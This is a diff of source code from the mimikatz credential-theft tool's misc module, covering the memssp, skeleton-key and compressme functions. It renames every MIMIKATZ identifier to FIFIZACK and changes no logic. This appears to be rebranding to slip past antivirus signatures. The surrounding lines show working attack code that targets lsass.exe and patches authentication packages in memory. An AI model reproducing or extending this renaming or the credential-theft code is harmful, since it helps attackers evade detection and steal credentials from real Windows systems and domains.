@@ -322,22 +322,22 @@ BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SI
 //
 //	if(argc > 1)
 //	{
-//		if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
+//		if((FIFIZACK_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7) && (FIFIZACK_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8))
 //		{
 //			pOs = w2k8r2;
 //			pOsSz = ARRAYSIZE(w2k8r2);
 //		}
-//		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
+//		else if((FIFIZACK_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_8) && (FIFIZACK_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE))
 //		{
 //			pOs = w2k12;
 //			pOsSz = ARRAYSIZE(w2k12);
 //		}
-//		else if((MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
+//		else if((FIFIZACK_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE) && (FIFIZACK_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_10))
 //		{
 //			pOs = w2k12r2;
 //			pOsSz = ARRAYSIZE(w2k12r2);
 //		}
-//		else if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
+//		else if(FIFIZACK_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10)
 //		{
 //			pOs = wservprev;
 //			pOsSz = ARRAYSIZE(wservprev);
@@ -522,7 +522,7 @@ NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
 				{
 					sSearch.kull_m_memoryRange.kull_m_memoryAdress = iMSV.DllBase;
 					sSearch.kull_m_memoryRange.size = iMSV.SizeOfImage;
-					if(pGeneric = kull_m_patch_getGenericFromBuild(MSV1_0AcceptReferences, ARRAYSIZE(MSV1_0AcceptReferences), MIMIKATZ_NT_BUILD_NUMBER))
+					if(pGeneric = kull_m_patch_getGenericFromBuild(MSV1_0AcceptReferences, ARRAYSIZE(MSV1_0AcceptReferences), FIFIZACK_NT_BUILD_NUMBER))
 					{
 						aLocal.address = pGeneric->Search.Pattern;
 						if(kull_m_memory_search(&aLocal, pGeneric->Search.Length, &sSearch, TRUE))
@@ -656,7 +656,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 		{NULL,				NULL,			(PVOID) 0x4444444444444444, NULL}, // Decrypt
 	};
 	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
-	BOOL onlyRC4Stuff = (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
+	BOOL onlyRC4Stuff = (FIFIZACK_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
 	RtlZeroMemory(&orig, sizeof(orig));
 	RtlInitUnicodeString(&orig, newerKey);
 	if(kull_m_process_getProcessIdForName(L"lsass.exe", &processId))
@@ -730,7 +730,7 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-#define MIMIKATZ_COMPRESSED_FILENAME	MIMIKATZ L"_" MIMIKATZ_ARCH L".compressed"
+#define FIFIZACK_COMPRESSED_FILENAME	FIFIZACK L"_" FIFIZACK_ARCH L".compressed"
 NTSTATUS kuhl_m_misc_compressme(int argc, wchar_t * argv[])
 {
 	PBYTE data, compressedData;
@@ -745,8 +745,8 @@ NTSTATUS kuhl_m_misc_compressme(int argc, wchar_t * argv[])
 		kprintf(L" * Original size  : %u\n", size);
 		if(kull_m_memory_quick_compress(data, size, (PVOID *) &compressedData, &compressedSize))
 		{
-			kprintf(L" * Compressed size: %u (%.2f%%)\nUsing \'%s\' as output file... ", compressedSize, 100 * ((float) compressedSize / (float) size), MIMIKATZ_COMPRESSED_FILENAME);
-			if(kull_m_file_writeData(MIMIKATZ_COMPRESSED_FILENAME, compressedData, compressedSize))
+			kprintf(L" * Compressed size: %u (%.2f%%)\nUsing \'%s\' as output file... ", compressedSize, 100 * ((float) compressedSize / (float) size), FIFIZACK_COMPRESSED_FILENAME);
+			if(kull_m_file_writeData(FIFIZACK_COMPRESSED_FILENAME, compressedData, compressedSize))
 				kprintf(L"OK!\n");
 			else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
 			LocalFree(compressedData);
